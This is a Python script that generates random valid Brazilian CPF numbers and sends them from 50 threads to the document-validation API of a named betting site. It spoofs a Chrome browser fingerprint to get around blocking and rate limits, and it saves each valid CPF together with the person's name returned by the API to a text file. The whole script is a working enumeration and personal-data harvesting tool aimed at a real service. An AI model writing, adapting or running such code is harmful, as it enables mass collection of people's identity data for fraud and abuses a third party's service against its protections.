#!/usr/bin/env python3
"""
Injetor 50 Threads - Configuração segura
"""
import random
import time
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from curl_cffi import requests

# Configuração
THREADS = 50
RODADAS = 40  # 50 x 40 = 2000 requisições
PAUSA = 2     # Segundos entre rodadas

# Sessão compartilhada
SESSION = None
lock = threading.Lock()

# Contadores
stats = {"ok": 0, "validos": 0, "blocked": 0, "rate_limit": 0, "erro": 0}
cpfs_validos = []

def gerar_cpf():
    cpf = [random.randint(0, 9) for _ in range(9)]
    soma = sum((10 - i) * cpf[i] for i in range(9))
    resto = soma % 11
    cpf.append(0 if resto < 2 else 11 - resto)
    soma = sum((11 - i) * cpf[i] for i in range(10))
    resto = soma % 11
    cpf.append(0 if resto < 2 else 11 - resto)
    return ''.join(map(str, cpf))

def worker(_):
    global SESSION
    cpf = gerar_cpf()
    
    try:
        r = SESSION.post(
            "https://7k.bet.br/api/documents/validate",
            json={"number": cpf, "type": "cpf"},
            headers={"Content-Type": "application/json", "Origin": "https://7k.bet.br"},
            timeout=15
        )
        
        status = r.status_code
        
        with lock:
            if status == 200:
                try:
                    nome = r.json().get("data", {}).get("name", "N/A")
                except:
                    nome = "N/A"
                cpfs_validos.append({"cpf": cpf, "nome": nome})
                stats["validos"] += 1
                stats["ok"] += 1
            elif status == 400:
                stats["ok"] += 1
            elif status == 403:
                stats["blocked"] += 1
            elif status == 429:
                stats["rate_limit"] += 1
            else:
                stats["erro"] += 1
        
        return status
        
    except:
        with lock:
            stats["erro"] += 1
        return -1

def main():
    global SESSION
    
    total = THREADS * RODADAS
    
    print("="*60)
    print(f"💉 INJETOR {THREADS} THREADS x {RODADAS} RODADAS = {total} REQ")
    print("="*60)
    
    SESSION = requests.Session(impersonate="chrome120")
    
    inicio = time.time()
    
    for rodada in range(1, RODADAS + 1):
        with ThreadPoolExecutor(max_workers=THREADS) as executor:
            futures = [executor.submit(worker, i) for i in range(THREADS)]
            for f in as_completed(futures):
                pass
        
        done = rodada * THREADS
        elapsed = time.time() - inicio
        rate = done / elapsed if elapsed > 0 else 0
        
        print(f"[{rodada:2d}/{RODADAS}] ✅{stats['ok']:4d} | 🎯{stats['validos']:3d} válidos | 🚫{stats['blocked']:3d} | {rate:.1f} req/s")
        
        if rodada < RODADAS:
            time.sleep(PAUSA)
    
    tempo = time.time() - inicio
    
    print("\n" + "="*60)
    print("📊 RESULTADO FINAL")
    print("="*60)
    print(f"   Total: {total} req em {tempo:.1f}s ({tempo/60:.1f} min)")
    print(f"   Velocidade: {total/tempo:.1f} req/s")
    print(f"\n   ✅ OK: {stats['ok']}")
    print(f"   🎯 Válidos: {stats['validos']}")
    print(f"   🚫 Blocked: {stats['blocked']}")
    print(f"   💥 Erros: {stats['erro']}")
    
    if cpfs_validos:
        print(f"\n🎯 {len(cpfs_validos)} CPFs VÁLIDOS:")
        with open("cpfs_50t.txt", "w", encoding="utf-8") as f:
            for v in cpfs_validos:
                cpf = v["cpf"]
                linha = f"{cpf[:3]}.{cpf[3:6]}.{cpf[6:9]}-{cpf[9:]} | {v['nome']}"
                print(f"   {linha}")
                f.write(linha + "\n")
        print(f"\n💾 Salvos em cpfs_50t.txt")

if __name__ == "__main__":
    main()







